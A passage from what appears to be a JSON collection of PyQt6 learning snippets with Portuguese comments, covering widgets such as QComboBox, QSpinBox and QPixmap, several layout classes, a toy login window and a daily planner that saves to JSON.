self.preco_sugerido_dic:\n\t\t\t\tif self.preco_sugerido_check.isChecked():\n\t\t\t\t\tpreco_sugerido = self.preco_sugerido_dic[item]\n\t\t\t\t\tpreco_sugerido_corrigido = preco_sugerido + (preco_sugerido * 0.01)\n\t\t\t\t\tpreco_sugerido_formatado = round(preco_sugerido_corrigido, 4)\n\t\t\t\t\tself.preco_sugerido_label.setText(f'T1001: R$ {preco_sugerido_formatado}')\t\t\t\n\t\t\t\telse: \n\t\t\t\t\tself.preco_sugerido_label.setText('T1001: R$ N/A')\n\t\t\tif item not in self.preco_sugerido_dic:\n\t\t\t\tself.preco_sugerido_label.setText('T1001: R$ N/A')\n\t\t\t\n\t\telse:\n\t\t\tself.preco_sugerido_label.setText('T1001: R$ N/A')\n"}, "QPixmap - imagem": {"categoria": "PyQt6", "codigo": "import sys\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QLabel)\nfrom PyQt6.QtCore import Qt\nfrom PyQt6.QtGui import QPixmap\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setFixedSize(500, 500)\n\t\tself.setWindowTitle('Imagem')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\n\tdef setUpMainWindow(self):\n\t\timagem_dinheiro = 'dinheiro.png'\n\n\t\twith open(imagem_dinheiro):\n\t\t\tobjeto = QLabel(self)\n\t\t\timagem = QPixmap(imagem_dinheiro)\n\t\t\timagem_red = imagem.scaled(200, 200)\n\t\t\tobjeto.setPixmap(imagem_red)\n\t\t\tobjeto.move(20, 20)\n\n\t\t\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.argv(app.exec())"}, "closeEvent - mensagem ao fechar janela": {"codigo": "import sys\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QLabel,\nQLineEdit, QPushButton, QCheckBox, QMessageBox)\nfrom PyQt6.QtGui import QFont, QPixmap\nfrom PyQt6.QtCore import Qt\nimport json\nfrom novoregistro import NovoUsuarioDialog\n\nclass JaneladeLogin(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\n\t#Inicializando a janela de logui e suas especifica\u00e7oes\t\n\tdef initializeUI(self):\n\t self.setFixedSize(360, 220)\n\t self.setWindowTitle('3.1 - Login GUI')\n\t self.setUpWindow()\n\t self.show()\n\t \n\t #Posicionando os Widgets\n\tdef setUpWindow(self):\n\t\tself.argumento_event = False\n\t\t\n\t\t#Texto usu\u00e1rio\n\t\tlogin_label = QLabel('Login', self)\n\t\tlogin_label.setFont(QFont('Arial', 20))\n\t\tlogin_label.move(160, 10)\n\t\t\n\t\t#Usu\u00e1rio texto e entrada\n\t\tusuario_label = QLabel('Usu\u00e1rio:', self)\n\t\tusuario_label.move(20, 54)\n\t\t\n\t\tself.usuario_edit = QLineEdit(self)\n\t\tself.usuario_edit.resize(250, 24)\n\t\tself.usuario_edit.move(90, 50)\n\t\t\n\t\t#Senha texto e entrada\n\t\tsenha_label = QLabel('Senha:', self)\n\t\tsenha_label.move(20, 86)\n\t\t\n\t\tself.senha_edit = QLineEdit(self)\n\t\tself.senha_edit.setEchoMode(QLineEdit.EchoMode.Password) #Esconde o que est\u00e1 escrito no QLineEdit()\n\t\tself.senha_edit.resize(250, 24)\n\t\tself.senha_edit.move(90, 82)\n\t\t\n\t\t#Criando um CheckBox() para mostrar ou esconder a senha:\n\t\tself.mostrar_senha_cb = QCheckBox('Mostrar senha?', self)\n\t\tself.mostrar_senha_cb.move(90, 110)\n\t\tself.mostrar_senha_cb.toggled.connect(self.ver_senha) #Conseguir ver a senha\n\t\t\n\t\t#Criando bot\u00e3o para fazer o login\n\t\tlogin_botao = QPushButton('Login', self)\n\t\tlogin_botao.resize(320, 34)\n\t\tlogin_botao.move(20, 140)\n\t\tlogin_botao.clicked.connect(self.logar) #Fazer o login\n\t\n\t\t#N\u00e3o membro Texto e botao\n\t\tnao_membro_label = QLabel('N\u00e3o \u00e9 membro?', self)\n\t\tnao_membro_label.move(20, 186)\n\t\t\n\t\tentrar_botao = QPushButton('Entrar', self)\n\t\tentrar_botao.move(120, 180)\n\t\tentrar_botao.clicked.connect(self.criar_novo_usuario)\n\t\n\t#Ao Apertar o Bot\u00e3o de logar\t\n\tdef logar(self):\n\t\tusuarios = {'samuel': 'shadow'}\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t#Pegando o que foi escrito na entrada de usu\u00e1rio e senha\n\t\tusuario = self.usuario_edit.text().strip()\n\t\tsenha = self.senha_edit.text().strip()\n\t\t\n\t\t#Verificando se o que foi pego est\u00e1 cadastrado e se est\u00e1 correto\n\t\t#Se estiver tudo corrento abrir um MessageBox dizendo que deu certo\n\t\tfor usuario_, senha_ in usuarios.items():\n\t\t\tif usuario_ == usuario and senha_ == senha:\n\t\t\t\tQMessageBox.information(self, 'Sucesso',\n\t\t\t\tf'''<p>O usu\u00e1rio: {usuario} foi reconhecido com sucesso!</p>\n\t\t\t\t<p>Seja Bem Vindo {usuario}!<p>''',\n\t\t\t\tQMessageBox.StandardButton.Ok,\n\t\t\t\tQMessageBox.StandardButton.Ok)\n\t\t\t\n\t\t\tif usuario_ != usuario or senha_ != senha:\n\t\t\t\tresposta = QMessageBox.warning(self, 'Login Error',\n\t\t\t\t'''<p>Usu\u00e1rio ou senha n\u00e3o localizado</p>\n\t\t\t\t<p>Deseja tentar novamente?</p>''',\n\t\t\t\tQMessageBox.StandardButton.Yes|\\\n\t\t\t\tQMessageBox.StandardButton.No,\n\t\t\t\tQMessageBox.StandardButton.Yes)\n\t\t\t\t\n\t\t\t\tif resposta == QMessageBox.StandardButton.Yes:\n\t\t\t\t\tpass\n\t\t\t\tif resposta == QMessageBox.StandardButton.No:\n\t\t\t\t\tself.close()\n\t\t\n\t#Mostrar ou n\u00e3o a senha\n\tdef ver_senha(self, checked):\n\t\tif checked:\n\t\t\tself.senha_edit.setEchoMode(QLineEdit.EchoMode.Normal)\n\t\t\t\n\t\telif checked == False:\n\t\t\tself.senha_edit.setEchoMode(QLineEdit.EchoMode.Password)\n\t \n\t#Criando um novo usu\u00e1rio em outra janela\n\tdef criar_novo_usuario(self):\n\t\tself.criar_usuario_janela = NovoUsuarioDialog()\n\t\tself.criar_usuario_janela.show()\n\t\n\t#Informando onde ser\u00e1 aberta a jenela a cima\n\tdef abrir_janela(self):\n\t\tself.main_window = MainWindow()\n\t\tself.main_window.show()\n\t\t\n\t#Exibindo uma pergunta se realmente quer sair ao apertar o x\n\tdef closeEvent(self, event):\n\t\tif self.argumento_event == True:  #Colocamos o (self.argumento_event=False) no inicio\n\t\t\tevent.accept()  #Isso significa fechar a janela\n\t\t\n\t\telse:  \t#Seguindo que o (self.argumento_event = False)\n\t\t\t\n\t\t\t#Exibe uma QMessageBox (Yes\\No) e coleta a sua resposta\n\t\t\tresposta = QMessageBox.question(self, 'Sair ?',\n\t\t\t\t\t\t'Voc\u00ea realmente deseja sair?',\n\t\t\t\t\t\tQMessageBox.StandardButton.Yes|\\\n\t\t\t\t\t\tQMessageBox.StandardButton.No,\n\t\t\t\t\t\t\tQMessageBox.StandardButton.No)\n\t\t\t\t\t\t\t\n\t\t\tif resposta == QMessageBox.StandardButton.Yes:\n\t\t\t\tevent.accept()\n\t\t\t\n\t\t\tif resposta == QMessageBox.StandardButton.No:\n\t\t\t\tevent.ignore()\n\t\t\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(640, 426)\n\t\tself.setWindowTitle('3.1 -\tMain Window')\n\t\t\n\t\t\t\t\n\n\napp = QApplication(sys.argv)\nwindow = JaneladeLogin()\nsys.exit(app.exec())", "categoria": "PyQt6"}, "QComboBox - caixa opcoes": {"codigo": "import sys\nfrom PyQt6.QtWidgets import (QWidget, QApplication, QLabel,\nQComboBox)\nfrom PyQt6.QtGui import QFont\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\t#self.setMaximumWidth(300) #Maximo comprimento\n\t\t#self.setMaximumHeigth(300) #Maximo altura\n\t\tself.setWindowTitle('Janela')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t#Self.showMaximized()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t'''Usamos o self nesse caso pois n\u00e3o estamos\n\t\tusando o gerenciador de layout, posicionando \n\t\tdessa forma widget por widget'''\n\t\t'''Self.itens para poder editar o QComboBox em \n\t\toutros metodos'''\n\t\tself.texto_label = QLabel('item ---', self)\n\t\tself.texto_label.adjustSize()\n\t\tself.texto_label.move(20, 60)\n\t\t\n\t\titens = []\n\t\tfor a in range(1000):\n\t\t\titens.append(f'item-{a}')\n\t\t\n\t\tself.itens_combo = QComboBox(self)\n\t\tself.itens_combo.addItems(itens)\n\t\t#Edita o estilo\n\t\tself.itens_combo.setStyleSheet('''background-color: #EED4A4;\n\t\tborder-radius: 10px; border: 2px solid gray;''')\n\t\tself.itens_combo.move(20, 20)\n\t\tself.itens_combo.currentTextChanged.connect(self.mostrar_item)\n\t\n\tdef mostrar_item(self, text):\n\t\tself.texto_label.setText(self.itens_combo.currentText())\n\t\tself.texto_label.adjustSize()\n\t\t\n\t\t\n\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n", "categoria": "PyQt6"}, "QSpinBox - caixa numeros": {"codigo": "import sys\nfrom PyQt6.QtWidgets import (QWidget, QApplication, QLabel,\nQSpinBox)\nfrom PyQt6.QtGui import QFont\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\t#self.setMaximumWidth(300) #Maximo comprimento\n\t\t#self.setMaximumHeigth(300) #Maximo altura\n\t\tself.setWindowTitle('Janela')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t#Self.showMaximized()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t'''Usamos o self nesse caso pois n\u00e3o estamos\n\t\tusando o gerenciador de layout, posicionando \n\t\tdessa forma widget por widget'''\n\t\t'''Self. para poder editar o widget em \n\t\toutros metodos'''\n\t\tself.texto_label = QLabel('item ---', self)\n\t\tself.texto_label.adjustSize()\n\t\tself.texto_label.move(20, 60)\n\t\t\n\t\t\n\t\t\n\t\tself.itens_spb = QSpinBox(self)\n\t\tself.itens_spb.resize(200, 20)\n\t\tself.itens_spb.setRange(1, 30)\n\t\t\n\t\t'''Edita o estilo'''\n\t\tself.itens_spb.setStyleSheet('''background-color: #EED4A4;\n\t\tborder-radius: 10px; border: 2px solid gray;''')\n\t\t\n\t\tself.itens_spb.move(20, 20)\n\t\tself.itens_spb.valueChanged.connect(self.mostrar_item)\n\t\t\n\t#Para pegar o que est\u00e1 no QSpinBox \u00e9 preciso o value\n\tdef mostrar_item(self, value):\n\t\tself.texto_label.setText(str(value))\n\t\tself.texto_label.adjustSize()\n\t\t\n\t\t\n\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())", "categoria": "PyQt6"}, "QDoubleSpinBox - caixa de numeros fracionados": {"codigo": "import sys\nfrom PyQt6.QtWidgets import (QWidget, QApplication, QLabel,\nQDoubleSpinBox)\nfrom PyQt6.QtGui import QFont\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\t#self.setMaximumWidth(300) #Maximo comprimento\n\t\t#self.setMaximumHeigth(300) #Maximo altura\n\t\tself.setWindowTitle('Janela')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t#Self.showMaximized()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t'''Usamos o self nesse caso pois n\u00e3o estamos\n\t\tusando o gerenciador de layout, posicionando \n\t\tdessa forma widget por widget'''\n\t\t'''Self. para poder editar o widget em \n\t\toutros metodos'''\n\t\tself.texto_label = QLabel('item ---', self)\n\t\tself.texto_label.adjustSize()\n\t\tself.texto_label.move(20, 60)\n\t\t\n\t\t\n\t\t\n\t\tself.itens_spb = QDoubleSpinBox(self)\n\t\tself.itens_spb.resize(200, 20)\n\t\tself.itens_spb.setRange(1.0, 30.0)\n\t\t\n\t\t'''Edita o estilo'''\n\t\tself.itens_spb.setStyleSheet('''background-color: #EED4A4;\n\t\tborder-radius: 10px; border: 2px solid gray;''')\n\t\t\n\t\tself.itens_spb.move(20, 20)\n\t\tself.itens_spb.valueChanged.connect(self.mostrar_item)\n\t\t\n\t#Para pegar o que est\u00e1 no QSpinBox \u00e9 preciso o value\n\tdef mostrar_item(self, value):\n\t\tself.texto_label.setText(str(value))\n\t\tself.texto_label.adjustSize()\n\t\t\n\t\t\n\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())", "categoria": "PyQt6"}, "QHBoxLayout - layout horizontal": {"codigo": "import sys\nfrom PyQt6.QtWidgets import (QWidget, QApplication, QLabel,\nQDoubleSpinBox)\nfrom PyQt6.QtGui import QFont\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\t#self.setMaximumWidth(300) #Maximo comprimento\n\t\t#self.setMaximumHeigth(300) #Maximo altura\n\t\tself.setWindowTitle('Janela')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t#Self.showMaximized()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t'''Usamos o self nesse caso pois n\u00e3o estamos\n\t\tusando o gerenciador de layout, posicionando \n\t\tdessa forma widget por widget'''\n\t\t'''Self. para poder editar o widget em \n\t\toutros metodos'''\n\t\tself.texto_label = QLabel('item ---', self)\n\t\tself.texto_label.adjustSize()\n\t\tself.texto_label.move(20, 60)\n\t\t\n\t\t\n\t\t\n\t\tself.itens_spb = QDoubleSpinBox(self)\n\t\tself.itens_spb.resize(200, 20)\n\t\tself.itens_spb.setRange(1.0, 30.0)\n\t\t\n\t\t'''Edita o estilo'''\n\t\tself.itens_spb.setStyleSheet('''background-color: #EED4A4;\n\t\tborder-radius: 10px; border: 2px solid gray;''')\n\t\t\n\t\tself.itens_spb.move(20, 20)\n\t\tself.itens_spb.valueChanged.connect(self.mostrar_item)\n\t\t\n\t#Para pegar o que est\u00e1 no QSpinBox \u00e9 preciso o value\n\tdef mostrar_item(self, value):\n\t\tself.texto_label.setText(str(value))\n\t\tself.texto_label.adjustSize()\n\t\t\n\t\t\n\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())", "categoria": "PyQt6"}, "QHBoxLayout + QVBoxLayout - layout(horizontal + vertical)": {"codigo": "import sys\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QLabel, QComboBox, \nQSpinBox, QHBoxLayout, QVBoxLayout)\nfrom PyQt6.QtCore import Qt\nfrom PyQt6.QtGui import QFont\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(400, 160)\n\t\tself.setWindowTitle('QVB, QHV e SpinB')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tinfo_label = QLabel('Selecione 2 itens para almo\u00e7ar e os respectivos pre\u00e7os')\n\t\tinfo_label.setFont(QFont('Arial', 16))\n\t\tinfo_label.setAlignment(Qt.AlignmentFlag.AlignCenter)\n\t\t\n\t\t\n\t\tlista_de_comida = ['ovo', 'saduiche turqu\u00eas', 'queijo', 'yorgute', 'ma\u00e7\u00e3', 'banana',\n\t\t'beterraba', 'caf\u00e9', 'macarr\u00e3o', '\u00e1gua', 'refrigerante', 'laranja', 'p\u00e3o', 'cenoura',\n\t\t'picanha']\n\t\t\n\t\tcomida_combo1 = QComboBox()\n\t\tcomida_combo1.addItems(lista_de_comida)\n\t\t\n\t\tcomida_combo2 = QComboBox()\n\t\tcomida_combo2.addItems(lista_de_comida)\n\t\t\n\t\t#Cria o spinBox\n\t\tself.preco_sb1 = QSpinBox()\n\t\tself.preco_sb1.setRange(0, 100)\n\t\tself.preco_sb1.setPrefix('R$')\n\t\tself.preco_sb1.valueChanged.connect(self.soma_total)\n\t\t\n\t\tself.preco_sb2 = QSpinBox()\n\t\tself.preco_sb2.setRange(0, 100)\n\t\tself.preco_sb2.setPrefix('R$')\n\t\tself.preco_sb2.valueChanged.connect(self.soma_total)\n\t\t\n\t\t#Horizontais widgets para o QComboBox\n\t\titem1_h_box = QHBoxLayout()\n\t\titem1_h_box.addWidget(comida_combo1)\n\t\titem1_h_box.addWidget(self.preco_sb1)\n\t\t\n\t\titem2_h_box = QHBoxLayout()\n\t\titem2_h_box.addWidget(comida_combo2)\n\t\titem2_h_box.addWidget(self.preco_sb2)\n\t\t\n\t\tself.total_label = QLabel('Total Gasto: R$')\n\t\tself.total_label.setFont(QFont('Arial', 16))\n\t\tself.total_label.setAlignment(Qt.AlignmentFlag.AlignRight)\n\t\t\n\t\tmain_v_box = QVBoxLayout()\n\t\tmain_v_box.addWidget(info_label)\n\t\tmain_v_box.addLayout(item1_h_box)\n\t\tmain_v_box.addLayout(item2_h_box)\n\t\tmain_v_box.addWidget(self.total_label)\n\t\tself.setLayout(main_v_box)\n\t\t\n\tdef soma_total(self):\n\t\ttotal = self.preco_sb1.value() + self.preco_sb2.value()\n\t\tself.total_label.setText(f'Total Gasto: R${total}')\n\t\t\n\t\t\n\t\t\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())", "categoria": "PyQt6"}, "QVBoxLayout - layout vertical": {"codigo": "import sys\nfrom PyQt6.QtWidgets import (QWidget, QApplication, QLabel, QCheckBox,\nQVBoxLayout, QButtonGroup, QPushButton)\nfrom PyQt6.QtCore import Qt\nfrom PyQt6.QtGui import QFont\n\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(350, 200)\n\t\tself.setWindowTitle('QVBoxLayout Example')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tcabeca_label = QLabel('Question\u00e1rio Exemplo')\n\t\tcabeca_label.setFont(QFont('Arial', 18))\n\t\tcabeca_label.setAlignment(Qt.AlignmentFlag.AlignCenter)\n\t\t\n\t\tpergunta_label = QLabel('O que voc\u00ea acha do nosso servi\u00e7o?')\n\t\tpergunta_label.setAlignment(Qt.AlignmentFlag.AlignTop)\n\t\t\n\t\tself.botao_confirmar = QPushButton('Confirmar')\n\t\tself.botao_confirmar.setEnabled(False)\n\t\tself.botao_confirmar.clicked.connect(self.close)\n\t\t\n\t\topcoes = ['satisfeito', 'Meio-Termo', 'Insatisfeito']\n\t\tbotoes_grupo = QButtonGroup(self)\n\t\tbotoes_grupo.buttonClicked.connect(self.checkboxclicado)\n\t\t\n\t\tmain_v_box = QVBoxLayout()\n\t\tmain_v_box.addWidget(cabeca_label)\n\t\tmain_v_box.addWidget(pergunta_label)\n\t\t\n\t\tfor cb in range(len(opcoes)):\n\t\t\topcao_cb = QCheckBox(opcoes[cb])\n\t\t\tbotoes_grupo.addButton(opcao_cb)\n\t\t\tmain_v_box.addWidget(opcao_cb)\n\t\tmain_v_box.addWidget(self.botao_confirmar)\n\t\tself.setLayout(main_v_box)\n\t\t\n\tdef checkboxclicado(self, button):\n\t\tprint(button.text())\n\t\tself.botao_confirmar.setEnabled(True)\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())", "categoria": "PyQt6"}, "QButtonGroup - grupo de botoes": {"codigo": "import sys\nfrom PyQt6.QtWidgets import (QWidget, QApplication, QLabel, QCheckBox,\nQVBoxLayout, QButtonGroup, QPushButton)\nfrom PyQt6.QtCore import Qt\nfrom PyQt6.QtGui import QFont\n\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(350, 200)\n\t\tself.setWindowTitle('QVBoxLayout Example')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tcabeca_label = QLabel('Question\u00e1rio Exemplo')\n\t\tcabeca_label.setFont(QFont('Arial', 18))\n\t\tcabeca_label.setAlignment(Qt.AlignmentFlag.AlignCenter)\n\t\t\n\t\tpergunta_label = QLabel('O que voc\u00ea acha do nosso servi\u00e7o?')\n\t\tpergunta_label.setAlignment(Qt.AlignmentFlag.AlignTop)\n\t\t\n\t\tself.botao_confirmar = QPushButton('Confirmar')\n\t\tself.botao_confirmar.setEnabled(False)\n\t\tself.botao_confirmar.clicked.connect(self.close)\n\t\t\n\t\topcoes = ['satisfeito', 'Meio-Termo', 'Insatisfeito']\n\t\tbotoes_grupo = QButtonGroup(self)\n\t\tbotoes_grupo.buttonClicked.connect(self.checkboxclicado)\n\t\t\n\t\tmain_v_box = QVBoxLayout()\n\t\tmain_v_box.addWidget(cabeca_label)\n\t\tmain_v_box.addWidget(pergunta_label)\n\t\t\n\t\tfor cb in range(len(opcoes)):\n\t\t\topcao_cb = QCheckBox(opcoes[cb])\n\t\t\tbotoes_grupo.addButton(opcao_cb)\n\t\t\tmain_v_box.addWidget(opcao_cb)\n\t\tmain_v_box.addWidget(self.botao_confirmar)\n\t\tself.setLayout(main_v_box)\n\t\t\n\tdef checkboxclicado(self, button):\n\t\tprint(button.text())\n\t\tself.botao_confirmar.setEnabled(True)\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n", "categoria": "PyQt6"}, "QGridLayout - layout por colunas e linhas(x, y, q, q)": {"categoria": "PyQt6", "codigo": "import sys, json\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QLabel, QLineEdit, QCheckBox,\nQTextEdit, QGridLayout)\nfrom PyQt6.QtCore import Qt, QDate\nfrom PyQt6.QtGui import QFont\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.textos = {}\n\t\tself.initializeUI()\n\t\t\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(500, 300)\n\t\tself.setWindowTitle('QGridLayout exemplo')\n\t\tself.setUpMainWindow()\n\t\tself.loadWidgetValueFromFile()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t'''Criando e organizando widgets na janela principal'''\n\t\theader_label = QLabel('Planejamento di\u00e1rio simples')\n\t\theader_label.setFont(QFont('Arial', 20))\n\t\theader_label.setAlignment(Qt.AlignmentFlag.AlignLeft)\n\t\t\n\t\t#Cria widgets para o lado esquerdo da janela principal\n\t\thoje_label = QLabel('. Foco de hoje')\n\t\thoje_label.setFont(QFont('Arial', 14))\n\t\tself.hoje_tedit = QTextEdit()\n\t\t\n\t\tnotas_label = QLabel('. Anota\u00e7\u00f5es')\n\t\tnotas_label.setFont(QFont('Arial', 14))\n\t\tself.notas_tedit = QTextEdit()\n\t\t\n\t\t#Organizando os widgets do lado esquerdo na coluna 0\n\t\t'''\nalignment=Qt.AlignmentFlag.AlignRight\nself.main_grid.addWidget(widget, linha, coluna, alignment)\nself.main_grid.addWidget(widget, linha, coluna, nu.linhas, nu.colunas, alignment)\n\t\t'''\n\t\tself.main_grid = QGridLayout()\n\t\tself.main_grid.addWidget(header_label, 0, 0)\n\t\tself.main_grid.addWidget(hoje_label, 1, 0)\n\t\tself.main_grid.addWidget(self.hoje_tedit, 2, 0, 3, 1)\n\t\tself.main_grid.addWidget(notas_label, 5, 0)\n\t\tself.main_grid.addWidget(self.notas_tedit, 6, 0, 3, 1)\n\t\t\n\t\t\n\t\t#Organizando os widgets no lado esquerdo \n\t\tdata_hoje = QDate.currentDate().toString(Qt.DateFormat.ISODate)\n\t\t\n\t\tdata_label = QLabel(data_hoje)\n\t\tdata_label.setFont(QFont('Arial', 14))\n\t\tdata_label.setAlignment(Qt.AlignmentFlag.AlignRight)\n\t\t\n\t\tfazer_label = QLabel('. Para Fazer')\n\t\tfazer_label.setFont(QFont('Arial', 14))\n\t\t\n\t\tself.main_grid.addWidget(data_label, 0, 2)\n\t\tself.main_grid.addWidget(fazer_label, 1, 1, 1, 2)\n\t\t\n\t\t#Criando 7 linhas a partir dos indices 2-9\n\t\tfor row in range(2, 9):\n\t\t\titem_cb = QCheckBox()\n\t\t\titem_edit = QLineEdit()\n\t\t\tself.main_grid.addWidget(item_cb, row, 1)\n\t\t\tself.main_grid.addWidget(item_edit, row, 2)\n\t\tself.setLayout(self.main_grid)\n\t\t\n\tdef saveWidgetsValues(self):\n\t\t'''Coleta e salva os valores dos widgets'''\n\t\tself.textos = {'foco': self.hoje_tedit.toPlainText(),\n\t\t\t\t'notas': self.notas_tedit.toPlainText()}\n\t\t\t\t\n\t\tfazer = []\n\t\t\n\t\tfor row in range(2, 9):\n\t\t\t\n\t\t\titem = self.main_grid.itemAtPosition(row, 1) #Recupera os objetos do QLayout\n\t\t\twidget = item.widget() #Temos o objeto e agora o widget\n\t\t\tif widget.isChecked() == False:\n\t\t\t\titem = self.main_grid.itemAtPosition(row, 2)\n\t\t\t\twidget = item.widget()\n\t\t\t\ttext = widget.text()\n\t\t\t\t\n\t\t\t\tfazer.append(text)\n\t\t\t\t\t\n\t\t\t\tself.textos['fazer'] = fazer  #Salvando a lista dentro do dicion\u00e1rio\n\t\t\t\n\t\ttry:\n\t\t\twith open('textos.json', 'w') as file:\n\t\t\t\tjson.dump(self.textos, file)\n\t\texcept FileNotFoundError:\n\t\t\tprint('Error ao salvar')\n\t\t\n\t\t\n\tdef closeEvent(self, event):\n\t\tself.saveWidgetsValues()\n\t\t\n\t\t\n\tdef loadWidgetValueFromFile(self):\n\t\ttry: \n\t\t\twith open('textos.json', 'r') as file:\n\t\t\t\tcontent = file.read()\n\t\t\t\tif content:\n\t\t\t\t\tself.textos.update(json.loads(content))\n\t\t\t\t\t\n\t\t\t\t\tself.hoje_tedit.setText(self.textos['foco'])\n\t\t\t\t\tself.notas_tedit.setText(self.textos['notas'])\n\t\t\t\t\t\n\t\t\t\t\tfor row in range(len(self.textos['fazer'])):\n\t\t\t\t\t\titem = self.main_grid.itemAtPosition(row + 2, 2)\n\t\t\t\t\t\t\n\t\t\t\t\t\twidget = item.widget()\n\t\t\t\t\t\twidget.setText(self.textos['fazer'][row])\n\t\t\t\t\t\n\t\texcept (FileNotFoundError, json.JSONDecodeError):\n\t\t\tprint('Falha no carregamento de informa\u00e7\u00f5es')\n\t\t\t\t\n\t\t\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n"}, "QFormLayout - layout linha a linha": {"categoria": "PyQt6", "codigo": "import sys\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QLabel, QPushButton,\nQDateEdit, QTextEdit, QComboBox, QFormLayout, QHBoxLayout, QLineEdit)\nfrom PyQt6.QtCore import Qt, QRegularExpression, QDate\nfrom PyQt6.QtGui import QFont, QRegularExpressionValidator\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(500, 400)\n\t\tself.setWindowTitle('QFormLayout Exemplo')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\n\tdef setUpMainWindow(self):\n\t\t''' Criando e organizando widgets na janela principal'''\n\t\theader_label = QLabel('Appoinment Form')\n\t\theader_label.setFont(QFont('Arial', 18))\n\t\theader_label.setAlignment(Qt.AlignmentFlag.AlignCenter)\n\t\t\n\t\tself.first_name_edit = QLineEdit()\n\t\tself.first_name_edit.setPlaceholderText('First')\n\t\tself.first_name_edit.textEdited.connect(self.clearText)\n\t\t\n\t\tself.last_name_edit = QLineEdit()\n\t\tself.last_name_edit.setPlaceholderText('Last')\n\t\tself.last_name_edit.textEdited.connect(self.clearText)\n\t\t\n\t\t#Criando o layout horizontal para nomes\n\t\tname_h_box = QHBoxLayout()\n\t\tname_h_box.addWidget(self.first_name_edit)\n\t\tname_h_box.addWidget(self.last_name_edit)\n\t\t\n\t\t\n\t\t#Criando widgets adicionais para serem adicionados na janela\n\t\tgender_combo = QComboBox()\n\t\tgender_combo.addItems(['Male', 'Female'])\n\t\t\n\t\tself.phone_edit = QLineEdit()\n\t\tself.phone_edit.setInputMask('(999) 999-9999;-')\n\t\tself.phone_edit.textEdited.connect(self.clearText)\n\t\t\n\t\tself.birthdate_edit = QDateEdit()\n\t\tself.birthdate_edit.setDisplayFormat('dd/mm/yyyy')\n\t\tself.birthdate_edit.setMaximumDate(QDate.currentDate())\n\t\tself.birthdate_edit.setCalendarPopup(True)\n\t\tself.birthdate_edit.setDate(QDate.currentDate())\n\t\t\n\t\tself.email_edit = QLineEdit()\n\t\tself.email_edit.setPlaceholderText('<username>@<dimain>.com')\n\t\t\n\t\treg_opt = 